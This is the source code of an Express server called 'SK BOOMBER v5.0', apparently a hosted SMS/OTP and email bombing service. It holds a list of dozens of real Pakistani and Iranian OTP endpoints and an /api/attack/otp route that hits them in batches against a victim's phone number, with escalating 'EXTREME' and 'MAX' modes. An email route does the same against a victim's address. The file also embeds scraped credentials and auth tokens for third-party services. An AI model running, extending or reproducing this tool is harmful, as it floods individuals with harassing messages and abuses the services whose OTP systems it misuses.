const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const OTP_APIS = {
  PK: [
    { name: 'eazylift', url: 'https://app.easylift.pk/api/oauth/token', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'priceoye', url: 'https://priceoye.pk/', method: 'GET', headers: {}, json: {}, data: {} },
    { name: 'bajao.pk', url: 'https://bajao.pk', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'deikho', url: 'https://deikho.com/api/sendOtp', method: 'POST', headers: {"User-Agent": "okhttp/5.0.0-alpha.14"}, json: {}, data: {} },
    { name: 'fikrfree', url: 'https://fikrfree.com.pk/api/generateToken', method: 'POST', headers: {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"}, json: {}, data: {"username": "jazzfikrfreeMAPP", "password": "In108ze64F1CwhgpuliqB5n"} },
    { name: 'gamenow', url: 'http://billingsocial.gamenow.com.pk', method: 'POST', headers: {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,pt;q=0.7", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://billingsocial.gamenow.com.pk", "Referer": "http://billingsocial.gamenow.com.pk/UserSubscription/JzWifi?tname=JAZZGPL113&chAdnet=gpljazz6&tn=805067018981", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "X-Requested-With": "XMLHttpRequest"}, json: {}, data: {} },
    { name: 'memeworld', url: 'https://app.memeworld.com.pk/login', method: 'POST', headers: {"authorization": "Basic YWRtaW46cGFzc293cmQ=", "origin": "https://memeworld.com.pk", "referer": "https://memeworld.com.pk/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"}, json: {}, data: {} },
    { name: 'mosafir', url: 'http://www.sub.mosafir.pk', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'mosafircall', url: 'https://mosafir.pk/my-mosafir/home', method: 'GET', headers: {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"}, json: {}, data: {} },
    { name: 'tamasha', url: 'https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/sign-up-wc', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'tapmad', url: 'https://www.tapmad.com/sign-up', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'broadway', url: 'https://services.broadwaypizza.com.pk/BroadwayAPI.aspx', method: 'GET', headers: {}, json: {}, data: {} },
    { name: 'cheezious', url: 'https://api.cheezious.com/v1/customers/sendOtp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'fixdar', url: 'https://foreefix.com/foreefix-api/api/web_user_register', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'jazz.com.pk', url: 'https://api.jazz.com.pk/v1/otp/send', method: 'POST', headers: {"User-Agent": "Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "X-Requested-With": "com.jazz.world", "Content-Type": "application/json"}, json: {}, data: {} },
    { name: 'zong.com.pk', url: 'https://onlineshop.zong.com.pk/api/send-otp', method: 'POST', headers: {"User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "X-Requested-With": "com.zong.myzong"}, json: {}, data: {} },
    { name: 'telenor.com.pk', url: 'https://www.telenor.com.pk/wp-json/telenor/v1/send-otp', method: 'POST', headers: {"User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "X-Requested-With": "com.telenor.myapp"}, json: {}, data: {} },
    { name: 'ufone.com', url: 'https://ufone.com/wp-json/ufone/v1/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'easypaisa.com.pk', url: 'https://easypaisa.com.pk/wp-json/easypaisa/v1/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'daraz.pk', url: 'https://member.daraz.pk/user/api/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'foodpanda.pk', url: 'https://www.foodpanda.pk/api/v1/login/otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'careem.com', url: 'https://identity.careem.com/api/v1/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'olx.com.pk', url: 'https://www.olx.com.pk/api/v1.0/users/login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'bykea.com', url: 'https://api.bykea.com/v1/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'jazzcash.com.pk', url: 'https://www.jazzcash.com.pk/api/customer/login-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'zong.com.pk', url: 'https://onlineshop.zong.com.pk/api/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'easypaisa.com.pk', url: 'https://easypaisa.com.pk/wp-json/easypaisa/v1/send-otp?msisdn=0{p}', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'daraz.pk', url: 'https://member.daraz.pk/user/api/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'foodpanda.pk', url: 'https://www.foodpanda.pk/api/v1/login/otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'careem.com', url: 'https://identity.careem.com/api/v1/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'olx.com.pk', url: 'https://www.olx.com.pk/api/v1.0/users/login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'bykea.com', url: 'https://api.bykea.com/v1/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'savyour.com.pk', url: 'https://api.savyour.com.pk/v1/auth/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'dukan.pk', url: 'https://api.dukan.pk/v1/otp/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'jazz.com.pk', url: 'https://api.jazz.com.pk/v1/otp/send', method: 'POST', headers: {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"}, json: {}, data: {} },
    { name: 'telenor.com.pk', url: 'https://www.telenor.com.pk/wp-json/telenor/v1/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'zong.com.pk', url: 'https://onlineshop.zong.com.pk/api/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'ufone.com', url: 'https://ufone.com/wp-json/ufone/v1/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'pakwheels', url: 'https://www.pakwheels.com/login-with-mobile.json', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'portall', url: 'https://portallapp.com/api/v1/auth/generate-otp-web', method: 'POST', headers: {"accept": "application/json", "content-type": "application/json", "origin": "https://portallapp.com", "referer": "https://portallapp.com/"}, json: {}, data: {} },
    { name: 'sastaticket', url: 'https://backend.sastaticket.pk/api/v3/users/generate_otp/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'weatherwalay', url: 'https://app.weatherwalay.com/webapp/otp/send-otp', method: 'POST', headers: {"Authorization": "Basic eHl3d19BdXRoLSMyMDIzIXo6d2VAdGhlcl9XZWIlMjBQbGFu", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"}, json: {}, data: {} },
    { name: 'nayabazaar', url: 'https://nayabazar.pk/controllers/login-by-phone', method: 'POST', headers: {"sec-ch-ua-platform": "\"Windows\"", "Referer": "https://nayabazar.pk/login?continue=%2Fproduct%2Foriginal-toshiba-aa-size-heavy-duty-cell-medium-P7PI4gNusyvi9hDNveRBHcPvUlUwIe", "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"", "sec-ch-ua-mobile": "?0", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, json: {}, data: {} },
    { name: 'oraan', url: 'https://baseapi.oraan.com/api/users/send-otp', method: 'POST', headers: {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "accept": "application/json"}, json: {}, data: {} },
    { name: 'udhaar', url: 'https://web.udhaar.pk/udhaar/dukaan/create/sendotp/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'xstate', url: 'https://api.xstate.pk/auth/phone', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'sportsx', url: 'https://server.sportsx.mobi/user/login/', method: 'POST', headers: {}, json: {}, data: {} },
  ],
  INT: [
    { name: 'Abantether', url: 'https://abantether.com/users/register/phone/send/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Achareh', url: 'https://api.achareh.co/v2/accounts/login/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Alibaba.ir', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Anargift', url: 'https://api.anargift.com/api/v1/auth/auth', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Banimode', url: 'https://mobapi.banimode.com/api/v2/auth/request', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Bikoplus', url: 'https://bikoplus.com/account/check-phone-number', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Bit24', url: 'https://bit24.cash/auth/bit24/api/v3/auth/check-mobile', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Bitpin', url: 'https://api.bitpin.org/v2/usr/signin/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Classino', url: 'https://student.classino.com/otp/v1/api/login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Delino', url: 'https://www.delino.com/user/register', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Digikala V1', url: 'https://api.digikala.com/v1/user/authenticate/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Digikala V2', url: 'https://api.digikala.com/v1/user/forgot/check/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'DigikalaJet', url: 'https://api.digikalajet.ir/user/login-register/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Divar', url: 'https://api.divar.ir/v5/auth/authenticate', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Dosma', url: 'https://app.dosma.ir/api/v1/account/send-otp/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'GapFilm', url: 'https://core.gapfilm.ir/api/v3.1/Account/Login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Hamrah-Mechanic', url: 'https://www.hamrah-mechanic.com/api/v1/membership/otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'IToll', url: 'https://app.itoll.com/api/v1/auth/login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Jabama', url: 'https://gw.jabama.com/api/v4/account/send-code', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Khodro45', url: 'https://khodro45.com/api/v1/customers/otp/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Lendo', url: 'https://api.lendo.ir/api/customer/auth/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Miare', url: 'https://www.miare.ir/api/otp/driver/request/', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Mootanroo', url: 'https://api.mootanroo.com/api/v3/auth/send-otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Namava', url: 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Nobat', url: 'https://nobat.ir/api/public/patient/login/phone', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'OKCS', url: 'https://my.okcs.com/api/check-mobile', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Ostadkr', url: 'https://api.ostadkr.com/login', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Paklean', url: 'https://client.api.paklean.com/download', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Rojashop', url: 'https://rojashop.com/api/send-otp-register', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Shab', url: 'https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Sheypoor', url: 'https://www.sheypoor.com/api/v10.0.0/auth/send', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Sibbazar', url: 'https://sandbox.sibbazar.com/api/v1/user/invite', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Sms.ir', url: 'https://appapi.sms.ir/api/app/auth/sign-up/verification-code', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Snapp V1', url: 'https://api.snapp.ir/api/v1/sms/link', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Snapp V2', url: 'https://digitalsignup.snapp.ir/ds3/api/v3/otp', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Taaghche', url: 'https://gw.taaghche.com/v4/site/auth/signup', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Tap33', url: 'https://tap33.me/api/v2/user', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Tapsi', url: 'https://api.tapsi.ir/api/v2.2/user', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Tebinja', url: 'https://www.tebinja.com/api/v1/users', method: 'POST', headers: {}, json: {}, data: {} },
    { name: 'Zigap', url: 'https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp', method: 'POST', headers: {}, json: {}, data: {} },
  ]
};


const EMAIL_APIS = [
  { name: 'Gmail', url: 'https://accounts.google.com/signup/v2/createaccount', method: 'POST' },
  { name: 'Outlook', url: 'https://signup.live.com/signup', method: 'POST' },
  { name: 'Yahoo', url: 'https://login.yahoo.com/account/create', method: 'POST' },
  { name: 'Proton', url: 'https://account.proton.me/api/users', method: 'POST' },
  { name: 'Zoho', url: 'https://accounts.zoho.com/signup', method: 'POST' },
  { name: 'Mailru', url: 'https://e.mail.ru/signup', method: 'POST' },
  { name: 'Yandex', url: 'https://passport.yandex.ru/registration', method: 'POST' },
  { name: 'AOL', url: 'https://login.aol.com/account/create', method: 'POST' },
  { name: 'GMX', url: 'https://www.gmx.com/mail/signup', method: 'POST' },
  { name: 'iCloud', url: 'https://appleid.apple.com/account', method: 'POST' }
];

let botData = {
  users: {}, verified: [], premium: [], banned: [],
  admins: ['shadowhacr'],
  stats: { totalAttacks: 0, totalOtps: 0, totalEmails: 0, totalUsers: 0 },
  logs: [], maintenance: false
};

async function sendOtpRequest(api, phone) {
  try {
    let url = api.url;
    let p10 = phone.slice(-10);
    let p9 = phone.slice(-9);
    url = url.replace(/{phone}/g, p10).replace(/{full_phone}/g, phone).replace(/{cc}/g, '92');

    let headers = { ...api.headers, 'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36' };
    let data = null;
    let jsonData = null;

    if (api.json && Object.keys(api.json).length > 0) {
      jsonData = {};
      for (let [k, v] of Object.entries(api.json)) {
        if (typeof v === 'string') v = v.replace(/{phone}/g, p10).replace(/{full_phone}/g, phone).replace(/{cc}/g, '92');
        jsonData[k] = v;
      }
    }

    if (api.data && Object.keys(api.data).length > 0) {
      data = new URLSearchParams();
      for (let [k, v] of Object.entries(api.data)) {
        if (typeof v === 'string') v = v.replace(/{phone}/g, p10).replace(/{full_phone}/g, phone).replace(/{cc}/g, '92');
        data.append(k, v);
      }
    }

    const response = await axios({
      method: api.method || 'POST',
      url: url,
      data: data || jsonData,
      headers: headers,
      timeout: 8000,
      validateStatus: () => true
    });

    return { sent: response.status >= 200 && response.status < 400, status: response.status };
  } catch (error) {
    return { sent: false, error: error.message };
  }
}

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', version: '5.0', name: 'SK BOOMBER', apis: { pk: OTP_APIS.PK.length, int: OTP_APIS.INT.length, email: EMAIL_APIS.length } });
});

app.get('/api/stats', (req, res) => {
  res.json({
    stats: botData.stats,
    totalUsers: Object.keys(botData.users).length,
    totalVerified: botData.verified.length,
    totalPremium: botData.premium.length,
    totalBanned: botData.banned.length,
    maintenance: botData.maintenance,
    logs: botData.logs.slice(0, 20)
  });
});

app.post('/api/user/track', (req, res) => {
  const { userId } = req.body;
  if (!botData.users[userId]) {
    botData.users[userId] = { id: userId, joined: new Date().toISOString(), attacks: 0 };
    botData.stats.totalUsers = Object.keys(botData.users).length;
  }
  res.json({ success: true, user: botData.users[userId] });
});

app.post('/api/attack/otp', async (req, res) => {
  const { phone, country, mode, userId } = req.body;
  if (!phone || !country || !mode) return res.status(400).json({ error: 'Missing parameters' });
  if (botData.banned.includes(userId)) return res.status(403).json({ error: 'You are banned!' });
  if (botData.maintenance && !botData.admins.includes(userId)) return res.status(503).json({ error: 'Maintenance mode active' });

  const modes = { NORMAL: 10, FAST: 20, EXTREME: 35, MAX: 100 };
  const apiCount = modes[mode] || 10;

  let apis = [];
  if (country === 'PK') apis = OTP_APIS.PK.slice(0, apiCount);
  else if (country === 'INT') apis = OTP_APIS.INT.slice(0, apiCount);
  else if (country === 'ALL') apis = [...OTP_APIS.PK, ...OTP_APIS.INT].slice(0, apiCount);
  else apis = OTP_APIS.PK.slice(0, apiCount);

  const results = [];
  let success = 0, failed = 0;
  const startTime = Date.now();

  const batchSize = 5;
  for (let i = 0; i < apis.length; i += batchSize) {
    const batch = apis.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(api => sendOtpRequest(api, phone)));
    batch.forEach((api, idx) => {
      const result = batchResults[idx];
      results.push({ name: api.name, sent: result.sent, status: result.status || 'error', error: result.error || null });
      if (result.sent) success++; else failed++;
    });
  }

  const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
  botData.stats.totalAttacks++;
  botData.stats.totalOtps += success;
  if (botData.users[userId]) botData.users[userId].attacks++;
  botData.logs.unshift({ type: 'OTP', phone, country, mode, success, total: apis.length, time: timeTaken, userId, date: new Date().toISOString() });
  if (botData.logs.length > 100) botData.logs.pop();

  res.json({ success: true, total: apis.length, sent: success, failed, time: timeTaken, results });
});

app.post('/api/attack/email', async (req, res) => {
  const { email, userId } = req.body;
  if (!email || !email.includes('@')) return res.status(400).json({ error: 'Invalid email' });
  if (botData.banned.includes(userId)) return res.status(403).json({ error: 'You are banned!' });

  const results = []; let success = 0, failed = 0;
  const startTime = Date.now();

  for (let api of EMAIL_APIS) {
    try {
      const response = await axios({ method: api.method, url: api.url, data: { email }, timeout: 5000, validateStatus: () => true });
      const sent = response.status >= 200 && response.status < 400;
      results.push({ name: api.name, sent, status: response.status });
      if (sent) success++; else failed++;
    } catch(e) { results.push({ name: api.name, sent: false, status: 'error' }); failed++; }
  }

  const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
  botData.stats.totalEmails += success;
  botData.logs.unshift({ type: 'EMAIL', email, success, total: EMAIL_APIS.length, time: timeTaken, userId, date: new Date().toISOString() });
  res.json({ success: true, total: EMAIL_APIS.length, sent: success, failed, time: timeTaken, results });
});

app.get('/api/tools/ipinfo', async (req, res) => {
  try {
    const targetIp = req.query.ip && req.query.ip !== 'me' ? req.query.ip : req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const response = await axios.get(`https://ipapi.co/${targetIp}/json/`, { timeout: 5000 });
    res.json(response.data);
  } catch (error) { res.status(500).json({ error: 'Failed to fetch IP info' }); }
});

app.post('/api/owner/maintenance', (req, res) => {
  const { password, status } = req.body;
  if (password !== 'shadow749926n') return res.status(403).json({ error: 'Invalid password' });
  botData.maintenance = status;
  res.json({ success: true, maintenance: status });
});

app.post('/api/owner/ban', (req, res) => {
  const { password, userId } = req.body;
  if (password !== 'shadow749926n') return res.status(403).json({ error: 'Invalid password' });
  if (!botData.banned.includes(userId)) botData.banned.push(userId);
  res.json({ success: true, banned: botData.banned });
});

app.post('/api/owner/unban', (req, res) => {
  const { password, userId } = req.body;
  if (password !== 'shadow749926n') return res.status(403).json({ error: 'Invalid password' });
  botData.banned = botData.banned.filter(u => u !== userId);
  res.json({ success: true, banned: botData.banned });
});

app.post('/api/owner/premium', (req, res) => {
  const { password, userId, action } = req.body;
  if (password !== 'shadow749926n') return res.status(403).json({ error: 'Invalid password' });
  if (action === 'add') { if (!botData.premium.includes(userId)) botData.premium.push(userId); }
  else { botData.premium = botData.premium.filter(u => u !== userId); }
  res.json({ success: true, premium: botData.premium });
});

app.post('/api/owner/broadcast', (req, res) => {
  const { password, message } = req.body;
  if (password !== 'shadow749926n') return res.status(403).json({ error: 'Invalid password' });
  res.json({ success: true, message, totalUsers: Object.keys(botData.users).length });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`💥 SK BOOMBER v5.0 running on port ${PORT}`);
  console.log(`👑 Shadow's Ultimate Weapon is LIVE`);
  console.log(`📊 APIs: PK=${OTP_APIS.PK.length}, INT=${OTP_APIS.INT.length}, Email=${EMAIL_APIS.length}`);
});
